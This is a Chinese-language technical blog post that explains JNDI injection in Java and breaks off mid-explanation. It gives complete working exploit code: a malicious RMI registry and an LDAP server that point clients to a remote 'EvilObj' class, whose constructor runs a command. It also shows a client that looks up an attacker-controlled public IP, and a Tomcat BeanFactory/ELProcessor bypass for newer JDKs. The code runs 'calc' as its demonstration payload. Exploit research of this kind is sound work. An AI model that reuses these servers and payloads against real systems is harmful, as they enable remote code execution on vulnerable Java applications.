<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<h1 data-content="1" id="be379d398f70f4d7376cc17068db39b4">JNDI</h1>
<p>首先我们要先了解一下什么是JNDI<br/>
JNDI全名(Java Naming and Directory Interface即Java命名和目录接口)</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241017105128-b519ca7a-8c32-1.png"/></p>
<h2 data-content="1" id="aa22d1813d49d26934c8fda075e2a483">命名服务</h2>
<p>命名服务的主要功能是将人们的友好名称映射到对象，例如地址、标识符或计算机程序通常使用的对象。</p>
<p>例如，Internet 域名系统 （DNS） 将计算机名称映射到 IP 地址：</p>
<p>www.example.com ==&gt; 192.0.2.5<br/>
文件系统将文件名映射到程序可用于访问文件内容的文件引用。</p>
<p>c:\bin\autoexec.bat ==&gt; File Reference</p>
<h2 data-content="1" id="d4111bacf3e32c9dec66d507f5f80a3c">目录服务</h2>
<p>许多命名服务都使用目录服务进行扩展。目录服务将名称与对象相关联，并将此类对象与属性相关联。</p>
<p>目录服务 = 命名服务 + 包含属性的对象</p>
<p>您不仅可以按对象名称查找对象，还可以获取对象的属性或根据对象的属性搜索对象。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241017105146-bf90c134-8c32-1.gif"/></p>
<p>例如，电话公司的目录服务。它将订阅者的姓名映射到他的地址和电话号码。计算机的目录服务与电话公司的目录服务非常相似，因为两者都可用于存储电话号码和地址等信息。然而，计算机的目录服务要强大得多，因为它可以在线获得，并且可以用来存储用户、程序甚至计算机本身和其他计算机可以使用的各种信息。</p>
<p>directory 对象表示计算环境中的对象。例如，目录对象可用于表示打印机、人员、计算机或网络。directory 对象包含描述它所表示的对象的属性。</p>
<h1 data-content="1" id="11427f0ef27ebb6fefecb01daedb4976">JNDI可以用多种服务对，对象进行命名，挂载。</h1>
<h2 data-content="1" id="2322a726c6fe6d86244b55b246a90ba0">RMI</h2>
<p>JNDI使用RMI的方式与很像</p>
<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">com.sun.jndi.rmi.registry.ReferenceWrapper</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">javax.naming.InitialContext</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.naming.NamingException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.naming.Reference</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.rmi.AlreadyBoundException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.rmi.RemoteException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.rmi.registry.LocateRegistry</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.rmi.registry.Registry</span><span class="o">;</span>
<span class="c1">//Server.java</span>
<span class="kd">public</span> <span class="kd">class</span> <span class="nc">JNDIRMIServer</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">RemoteException</span><span class="o">,</span> <span class="n">NamingException</span><span class="o">,</span> <span class="n">AlreadyBoundException</span> <span class="o">{</span>
        <span class="n">Registry</span> <span class="n">registry</span> <span class="o">=</span> <span class="n">LocateRegistry</span><span class="o">.</span><span class="na">createRegistry</span><span class="o">(</span><span class="mi">1099</span><span class="o">);</span>
        <span class="n">InitialContext</span> <span class="n">ic</span> <span class="o">=</span> <span class="k">new</span> <span class="n">InitialContext</span><span class="o">();</span>
    <span class="n">Reference</span> <span class="n">ref</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Reference</span><span class="o">(</span><span class="s">"EvilObj"</span><span class="o">,</span><span class="s">"EvilObj"</span><span class="o">,</span><span class="s">"http://127.0.0.1:8000"</span><span class="o">);</span>
    <span class="n">ic</span><span class="o">.</span><span class="na">rebind</span><span class="o">(</span><span class="s">"rmi://localhost:1099/EvilObj"</span><span class="o">,</span><span class="n">ref</span><span class="o">);</span>
<span class="cm">/*        ReferenceWrapper wrapper = new ReferenceWrapper(ref);</span>
<span class="cm">        registry.bind("RCE",wrapper);*/</span>
    <span class="o">}</span>
<span class="o">}</span>

<span class="c1">//Client.java</span>
<span class="kn">import</span> <span class="nn">org.omg.CORBA.IRObject</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">javax.naming.InitialContext</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.naming.NamingException</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">Client</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">NamingException</span> <span class="o">{</span>
        <span class="n">InitialContext</span> <span class="n">ic</span><span class="o">=</span> <span class="k">new</span> <span class="n">InitialContext</span><span class="o">();</span>
        <span class="n">ic</span><span class="o">.</span><span class="na">lookup</span><span class="o">(</span><span class="s">"rmi://localhost:1099/EvilObj"</span><span class="o">);</span>

    <span class="o">}</span>
<span class="o">}</span>

<span class="c1">//EvilObjv</span>
<span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.rmi.RemoteException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.rmi.server.UnicastRemoteObject</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.util.Hashtable</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.naming.Context</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.naming.Name</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.naming.spi.ObjectFactory</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">EvilObj</span> <span class="kd">extends</span> <span class="n">UnicastRemoteObject</span> <span class="kd">implements</span> <span class="n">ObjectFactory</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="nf">EvilObj</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">RemoteException</span> <span class="o">{</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">"calc"</span><span class="o">);</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IOException</span> <span class="n">var2</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">IOException</span> <span class="n">e</span> <span class="o">=</span> <span class="n">var2</span><span class="o">;</span>
            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
        <span class="o">}</span>

    <span class="o">}</span>

    <span class="kd">public</span> <span class="n">String</span> <span class="nf">sayHello</span><span class="o">(</span><span class="n">String</span> <span class="n">name</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">RemoteException</span> <span class="o">{</span>
        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"Hello World!"</span><span class="o">);</span>
        <span class="k">return</span> <span class="n">name</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="n">Object</span> <span class="nf">getObjectInstance</span><span class="o">(</span><span class="n">Object</span> <span class="n">obj</span><span class="o">,</span> <span class="n">Name</span> <span class="n">name</span><span class="o">,</span> <span class="n">Context</span> <span class="n">nameCtx</span><span class="o">,</span> <span class="n">Hashtable</span><span class="o">&lt;?,</span> <span class="o">?&gt;</span> <span class="n">environment</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
        <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
    <span class="o">}</span>
<span class="o">}</span>
<span class="c1">//恶意类是需要实现ObjectFactory接口的，即恶意工厂</span>
</pre></div>
<p>运行上面的代码就会发现JNDI的客户端加载了服务端上的EvilObj</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241017105216-d17c5606-8c32-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241017105222-d4fc4fde-8c32-1.png"/></p>
<p>一路调试会发现其最后弹计算机也就是触发命令执行的地方并不在JNDI这个包下而是进入了NamingManager</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241017105232-daebcfbe-8c32-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241017105247-e44c9674-8c32-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241017105253-e7bea734-8c32-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241017105258-eac93ff2-8c32-1.png"/></p>
<p>最后在loadClass里发现forName来加载类，而forName加载的是本地的类，而本地并没有我们的恶意类。我们继续调试</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241017105306-ef2da42a-8c32-1.png"/></p>
<p>会发现其判断clas是否为空，codebase是否为空。当我们前面forName加载成功时就不会进入反之。<br/>
而后继续远程加载类</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241017105312-f3045cf6-8c32-1.png"/></p>
<p>最后发现其将加载的类进行了实例化，即会运行恶意类中构造方法中的恶意代码</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241017105318-f675b164-8c32-1.png"/></p>
<p>使用如果一个JNDI其lookup内的url可控，那么我们就就可以让其指向我们的恶意rmi服务器从而使其造成命令执行</p>
<h2 data-content="1" id="c73720ad33b764d77ed68cfa37e8e2f0">Ldap</h2>
<p>这个漏洞在爆出来后很快就被官方打了补丁。如下</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241017105324-fa63dd3c-8c32-1.png"/></p>
<p>上面的代码定义了一个系统变量trustURLCodebase。默认为false</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241017105329-fd43b518-8c32-1.png"/></p>
<p>上面的代码对trustURLCodebase进行了判断，我们可以发现因为起默认为false，这导致我们无法加载远程的url的类</p>
<p>其补丁将rmi进行了检测导致我们无法利用rmi来进行命令执行，但是其没有对Ldap进行过滤，所有我们还可以使用Ldap来进行命令执行<br/>
使用如下代码起一个Ldap加载恶意类的服务</p>
<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">com.unboundid.ldap.listener.InMemoryDirectoryServer</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">com.unboundid.ldap.listener.InMemoryDirectoryServerConfig</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">com.unboundid.ldap.listener.InMemoryListenerConfig</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">com.unboundid.ldap.sdk.Entry</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">com.unboundid.ldap.sdk.LDAPException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">com.unboundid.ldap.sdk.LDAPResult</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">com.unboundid.ldap.sdk.ResultCode</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">javax.net.ServerSocketFactory</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.net.SocketFactory</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.net.ssl.SSLSocketFactory</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.net.InetAddress</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.net.MalformedURLException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.net.URL</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">Ldap</span> <span class="o">{</span>

    <span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="n">String</span> <span class="n">LDAP_BASE</span> <span class="o">=</span> <span class="s">"dc=example,dc=com"</span><span class="o">;</span>

    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span> <span class="o">(</span> <span class="n">String</span><span class="o">[]</span> <span class="n">tmp_args</span> <span class="o">)</span> <span class="o">{</span>
        <span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">=</span><span class="k">new</span> <span class="n">String</span><span class="o">[]{</span><span class="s">"http://127.0.0.1:8000/#EvilObj"</span><span class="o">};</span>
        <span class="kt">int</span> <span class="n">port</span> <span class="o">=</span> <span class="mi">2234</span><span class="o">;</span>

        <span class="k">try</span> <span class="o">{</span>
            <span class="n">InMemoryDirectoryServerConfig</span> <span class="n">config</span> <span class="o">=</span> <span class="k">new</span> <span class="n">InMemoryDirectoryServerConfig</span><span class="o">(</span><span class="n">LDAP_BASE</span><span class="o">);</span>
            <span class="n">config</span><span class="o">.</span><span class="na">setListenerConfigs</span><span class="o">(</span><span class="k">new</span> <span class="n">InMemoryListenerConfig</span><span class="o">(</span>
                    <span class="s">"listen"</span><span class="o">,</span> <span class="c1">//$NON-NLS-1$</span>
                    <span class="n">InetAddress</span><span class="o">.</span><span class="na">getByName</span><span class="o">(</span><span class="s">"0.0.0.0"</span><span class="o">),</span> <span class="c1">//$NON-NLS-1$</span>
                    <span class="n">port</span><span class="o">,</span>
                    <span class="n">ServerSocketFactory</span><span class="o">.</span><span class="na">getDefault</span><span class="o">(),</span>
                    <span class="n">SocketFactory</span><span class="o">.</span><span class="na">getDefault</span><span class="o">(),</span>
                    <span class="o">(</span><span class="n">SSLSocketFactory</span><span class="o">)</span> <span class="n">SSLSocketFactory</span><span class="o">.</span><span class="na">getDefault</span><span class="o">()));</span>

            <span class="n">config</span><span class="o">.</span><span class="na">addInMemoryOperationInterceptor</span><span class="o">(</span><span class="k">new</span> <span class="n">OperationInterceptor</span><span class="o">(</span><span class="k">new</span> <span class="n">URL</span><span class="o">(</span><span class="n">args</span><span class="o">[</span> <span class="mi">0</span> <span class="o">])));</span>
            <span class="n">InMemoryDirectoryServer</span> <span class="n">ds</span> <span class="o">=</span> <span class="k">new</span> <span class="n">InMemoryDirectoryServer</span><span class="o">(</span><span class="n">config</span><span class="o">);</span>
            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"Listening on 0.0.0.0:"</span> <span class="o">+</span> <span class="n">port</span><span class="o">);</span> <span class="c1">//$NON-NLS-1$</span>
            <span class="n">ds</span><span class="o">.</span><span class="na">startListening</span><span class="o">();</span>

        <span class="o">}</span>
        <span class="k">catch</span> <span class="o">(</span> <span class="n">Exception</span> <span class="n">e</span> <span class="o">)</span> <span class="o">{</span>
            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
        <span class="o">}</span>
    <span class="o">}</span>

    <span class="kd">private</span> <span class="kd">static</span> <span class="kd">class</span> <span class="nc">OperationInterceptor</span> <span class="kd">extends</span> <span class="n">InMemoryOperationInterceptor</span> <span class="o">{</span>

        <span class="kd">private</span> <span class="n">URL</span> <span class="n">codebase</span><span class="o">;</span>

        <span class="kd">public</span> <span class="nf">OperationInterceptor</span> <span class="o">(</span> <span class="n">URL</span> <span class="n">cb</span> <span class="o">)</span> <span class="o">{</span>
            <span class="k">this</span><span class="o">.</span><span class="na">codebase</span> <span class="o">=</span> <span class="n">cb</span><span class="o">;</span>
        <span class="o">}</span>

        <span class="nd">@Override</span>
        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">processSearchResult</span> <span class="o">(</span> <span class="n">InMemoryInterceptedSearchResult</span> <span class="n">result</span> <span class="o">)</span> <span class="o">{</span>
            <span class="n">String</span> <span class="n">base</span> <span class="o">=</span> <span class="n">result</span><span class="o">.</span><span class="na">getRequest</span><span class="o">().</span><span class="na">getBaseDN</span><span class="o">();</span>
            <span class="n">Entry</span> <span class="n">e</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Entry</span><span class="o">(</span><span class="n">base</span><span class="o">);</span>
            <span class="k">try</span> <span class="o">{</span>
                <span class="n">sendResult</span><span class="o">(</span><span class="n">result</span><span class="o">,</span> <span class="n">base</span><span class="o">,</span> <span class="n">e</span><span class="o">);</span>
            <span class="o">}</span>
            <span class="k">catch</span> <span class="o">(</span> <span class="n">Exception</span> <span class="n">e1</span> <span class="o">)</span> <span class="o">{</span>
                <span class="n">e1</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
            <span class="o">}</span>
        <span class="o">}</span>

        <span class="kd">protected</span> <span class="kt">void</span> <span class="nf">sendResult</span> <span class="o">(</span> <span class="n">InMemoryInterceptedSearchResult</span> <span class="n">result</span><span class="o">,</span> <span class="n">String</span> <span class="n">base</span><span class="o">,</span> <span class="n">Entry</span> <span class="n">e</span> <span class="o">)</span> <span class="kd">throws</span> <span class="n">LDAPException</span><span class="o">,</span> <span class="n">MalformedURLException</span> <span class="o">{</span>
            <span class="n">URL</span> <span class="n">turl</span> <span class="o">=</span> <span class="k">new</span> <span class="n">URL</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">codebase</span><span class="o">,</span> <span class="k">this</span><span class="o">.</span><span class="na">codebase</span><span class="o">.</span><span class="na">getRef</span><span class="o">().</span><span class="na">replace</span><span class="o">(</span><span class="sc">'.'</span><span class="o">,</span> <span class="sc">'/'</span><span class="o">).</span><span class="na">concat</span><span class="o">(</span><span class="s">".class"</span><span class="o">));</span>
            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"Send LDAP reference result for "</span> <span class="o">+</span> <span class="n">base</span> <span class="o">+</span> <span class="s">" redirecting to "</span> <span class="o">+</span> <span class="n">turl</span><span class="o">);</span>
            <span class="n">e</span><span class="o">.</span><span class="na">addAttribute</span><span class="o">(</span><span class="s">"javaClassName"</span><span class="o">,</span> <span class="s">"foo"</span><span class="o">);</span>
            <span class="n">String</span> <span class="n">cbstring</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">codebase</span><span class="o">.</span><span class="na">toString</span><span class="o">();</span>
            <span class="kt">int</span> <span class="n">refPos</span> <span class="o">=</span> <span class="n">cbstring</span><span class="o">.</span><span class="na">indexOf</span><span class="o">(</span><span class="sc">'#'</span><span class="o">);</span>
            <span class="k">if</span> <span class="o">(</span> <span class="n">refPos</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">)</span> <span class="o">{</span>
                <span class="n">cbstring</span> <span class="o">=</span> <span class="n">cbstring</span><span class="o">.</span><span class="na">substring</span><span class="o">(</span><span class="mi">0</span><span class="o">,</span> <span class="n">refPos</span><span class="o">);</span>
            <span class="o">}</span>
            <span class="n">e</span><span class="o">.</span><span class="na">addAttribute</span><span class="o">(</span><span class="s">"javaCodeBase"</span><span class="o">,</span> <span class="n">cbstring</span><span class="o">);</span>
            <span class="n">e</span><span class="o">.</span><span class="na">addAttribute</span><span class="o">(</span><span class="s">"objectClass"</span><span class="o">,</span> <span class="s">"javaNamingReference"</span><span class="o">);</span> <span class="c1">//$NON-NLS-1$</span>
            <span class="n">e</span><span class="o">.</span><span class="na">addAttribute</span><span class="o">(</span><span class="s">"javaFactory"</span><span class="o">,</span> <span class="k">this</span><span class="o">.</span><span class="na">codebase</span><span class="o">.</span><span class="na">getRef</span><span class="o">());</span>
            <span class="n">result</span><span class="o">.</span><span class="na">sendSearchEntry</span><span class="o">(</span><span class="n">e</span><span class="o">);</span>
            <span class="n">result</span><span class="o">.</span><span class="na">setResult</span><span class="o">(</span><span class="k">new</span> <span class="n">LDAPResult</span><span class="o">(</span><span class="mi">0</span><span class="o">,</span> <span class="n">ResultCode</span><span class="o">.</span><span class="na">SUCCESS</span><span class="o">));</span>
        <span class="o">}</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<p>上面的java代码可以打包成jar包而后放在vps上运行。<br/>
而后Client端与之前RMi的相似</p>
<div class="highlight"><pre><span></span><span class="c1">//import org.omg.CORBA.IRObject;</span>

<span class="kn">import</span> <span class="nn">javax.naming.InitialContext</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.naming.NamingException</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">Client</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">NamingException</span> <span class="o">{</span>
        <span class="n">InitialContext</span> <span class="n">ic</span><span class="o">=</span> <span class="k">new</span> <span class="n">InitialContext</span><span class="o">();</span>
        <span class="c1">//ic.lookup("rmi://111.230.38.159:1099/EvilObj");</span>
        <span class="c1">//ic.lookup("rmi://192.168.20.1:1099/EvilObj");</span>
        <span class="n">ic</span><span class="o">.</span><span class="na">lookup</span><span class="o">(</span><span class="s">"ldap://111.230.38.159:2234/EvilObj"</span><span class="o">);</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<p>成功弹出计算机</p>
<p>调试了一下，发现最终的运行位置与RMi相同。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241017105348-0893a9f0-8c33-1.png"/></p>
<h1 data-content="1" id="1cf831d985dfde6400ee5808982fe111">更高版本的绕过</h1>
<p>像Ldap只能绕过8u191之前的JDK我们这里手动调一下</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241017105355-0c715130-8c33-1.png"/></p>
<p>我们可以发现其在远程加载codebase的lodaClass下也加了一个trustURLCodebase这个参数。而这个参数默认肯定是false，即其不允许我们使用远端的codebase来加载工厂</p>
<p>但是其只尝试了对远程加载进行了限制，那么我们就可以尝试使用其本地的类来尝试进行命令执行。</p>
<p>而这个类是要实现了ObjectFactory。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241017105401-1060c1b8-8c33-1.png"/></p>
<p>我们在调试的时候就可以发现，每次在调试时都会调用这个getObjectInstance方法。那么我们可以尝试在哪些实现了ObjectFactory接口的getObjectInstance方法里寻找是否存在可以利用的部分</p>
<h2 data-content="1" id="fadaccdcad7826fb84fe69e0e6cc6098">Tomcat9.62</h2>
<p>首先在tomcat9.62及其之前下存在一个类实现了ObjectFactory且我们可以利用其反射来进行命令执行。</p>
<p>在此之前我们要先了解一个命令执行的姿势，利用ELProcessor来进行命令执行。<br/>
ELProcessor内存在一个eval方法，其会对命令进行反射调用，我这里写个demo</p>
<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">javax.el.*</span><span class="o">;</span>
<span class="kd">public</span> <span class="kd">class</span> <span class="nc">DEMO</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">ELProcessor</span> <span class="n">processor</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ELProcessor</span><span class="o">();</span>
        <span class="n">processor</span><span class="o">.</span><span class="na">eval</span><span class="o">(</span><span class="s">"Runtime.getRuntime().exec(\"calc\")"</span><span class="o">);</span>

    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241017105409-1505738a-8c33-1.png"/></p>
<p>我们在eval下打个断点简单调试一下，会发现其最后利用了反射的方法进行了命令执行</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241017105415-1889968a-8c33-1.png"/></p>
<p>我们把视线重新转到实现了ObjectFactory的可利用类下。</p>
<p>这个可以被利用的类就是tomcat的BeanFactory类</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241017105420-1b76ddee-8c33-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241017105425-1ec9b6e2-8c33-1.png"/></p>
<p>最终其会在BeanFactory下的一个反射类调用触发命令执行，而这些参数都是我们可以控制的，接下来我会通过调试攻击过程的方式来，讲述漏洞的触发过程</p>
<div class="highlight"><pre><span></span><span class="c1">//Server.java</span>
<span class="kn">import</span> <span class="nn">com.sun.jndi.rmi.registry.ReferenceWrapper</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.apache.naming.ResourceRef</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">javax.naming.StringRefAddr</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.rmi.RemoteException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.rmi.registry.LocateRegistry</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.rmi.registry.Registry</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.rmi.server.UnicastRemoteObject</span><span class="o">;</span>
<span class="kd">public</span> <span class="kd">class</span> <span class="nc">Server</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
        <span class="c1">//System.setProperty("java.rmi.server.hostname", "1.94.186.199");//如果要在服务器上允许需要加上这一条代码。</span>
        <span class="n">Registry</span> <span class="n">registry</span> <span class="o">=</span> <span class="n">LocateRegistry</span><span class="o">.</span><span class="na">createRegistry</span><span class="o">(</span><span class="mi">1099</span><span class="o">);</span>
        <span class="n">ResourceRef</span> <span class="n">resourceRef</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ResourceRef</span><span class="o">(</span><span class="s">"javax.el.ELProcessor"</span><span class="o">,</span> <span class="o">(</span><span class="n">String</span><span class="o">)</span><span class="kc">null</span><span class="o">,</span> <span class="s">""</span><span class="o">,</span> <span class="s">""</span><span class="o">,</span> <span class="kc">true</span><span class="o">,</span> <span class="s">"org.apache.naming.factory.BeanFactory"</span><span class="o">,</span> <span class="o">(</span><span class="n">String</span><span class="o">)</span><span class="kc">null</span><span class="o">);</span><span class="c1">//创建一个ResourceRef对象，其传入的Class为javax.el.ELProcessor，工厂为org.apache.naming.factory.BeanFactory</span>
        <span class="n">resourceRef</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="k">new</span> <span class="n">StringRefAddr</span><span class="o">(</span><span class="s">"forceString"</span><span class="o">,</span> <span class="s">"faster=eval"</span><span class="o">));</span><span class="c1">//添加RefAddr对象，前一个参数是键值Type。在BeanFactory类内会被取出值</span>
        <span class="n">resourceRef</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="k">new</span> <span class="n">StringRefAddr</span><span class="o">(</span><span class="s">"faster"</span><span class="o">,</span> <span class="s">"Runtime.getRuntime().exec(\"calc\")"</span><span class="o">));</span><span class="c1">//同上</span>
        <span class="n">ReferenceWrapper</span> <span class="n">referenceWrapper</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ReferenceWrapper</span><span class="o">(</span><span class="n">resourceRef</span><span class="o">);</span>
        <span class="n">registry</span><span class="o">.</span><span class="na">bind</span><span class="o">(</span><span class="s">"Tomcat9.62"</span><span class="o">,</span> <span class="n">referenceWrapper</span><span class="o">);</span>
        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"Registry运行中......"</span><span class="o">);</span>

    <span class="o">}</span>
<span class="o">}</span>
<span class="c1">//Client.java</span>
<span class="kn">import</span> <span class="nn">javax.naming.InitialContext</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.naming.NamingException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.naming.spi.ObjectFactory</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">Client</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">NamingException</span> <span class="o">{</span>
        <span class="n">InitialContext</span> <span class="n">ic</span><span class="o">=</span> <span class="k">new</span> <span class="n">InitialContext</span><span class="o">();</span>
        <span class="n">ic</span><span class="o">.</span><span class="na">lookup</span><span class="o">(</span><span class="s">"rmi://192.168.20.1:1099/Tomcat9.62"</span><span class="o">);</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<p>前面实例化工厂的部分与RMI和Ldap的大同小异。</p>
<p>会进入NamingManager下的getObjectInstance来进行实例化</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241017105433-23211fe6-8c33-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241017105440-278bb636-8c33-1.png"/></p>
<p>如何得到工厂的类名</p>
<p>再通过forName来加载类</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241017105449-2c9da40e-8c33-1.png"/></p>
<p>最后实例化得到了工厂</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241017105457-31a06e8c-8c33-1.png"/></p>
<p>得到工厂后会走到如下代码从而进入BeanFactory的getObjectInstance</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241017105506-37218850-8c33-1.png"/></p>
<p>其传入的参数ref，就是我们再Server中实例化的ResourceRef类值如下</p>
